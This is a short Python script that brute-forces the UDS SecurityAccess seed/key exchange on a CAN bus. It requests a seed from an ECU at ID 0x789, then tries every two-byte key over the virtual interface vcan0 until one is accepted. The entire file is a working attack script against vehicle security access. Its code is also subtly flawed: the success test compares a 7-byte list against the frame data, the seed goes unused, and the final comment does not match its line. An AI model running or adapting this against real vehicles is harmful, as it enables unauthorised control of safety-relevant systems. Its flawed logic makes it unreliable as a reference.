import can
import random
import time

bus = can.interface.Bus(channel='vcan0', bustype='socketcan')

request = can.Message(arbitration_id=0x789, data=[0x02, 0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00], is_extended_id=False)
bus.send(request)
response = bus.recv()
if response is None:
    print("No response received within the timeout period.")
else:
    seed1 = response.data[3]
    seed2 = response.data[4]
    print("Received seed:", seed1, seed2)

def brute_force():
    for key1 in range(256):
        for key2 in range(256):

            request = can.Message(arbitration_id=0x789, data=[0x04, 0x27, 0x02, key1, key2, 0x00, 0x00, 0x00], is_extended_id=False)
            bus.send(request)
            response = bus.recv(timeout=1)

            if response is not None and list(response.data) == [0x02, 0x67, 0x02, 0x00, 0x00, 0x00, 0x00]:
                print(f"CRACKED Key: {key1:02X} {key2:02X}")
                return key1, key2
    print("Failed to crack the key.")

result = brute_force()
bus.shutdown()  # Wait for a short time before sending the next request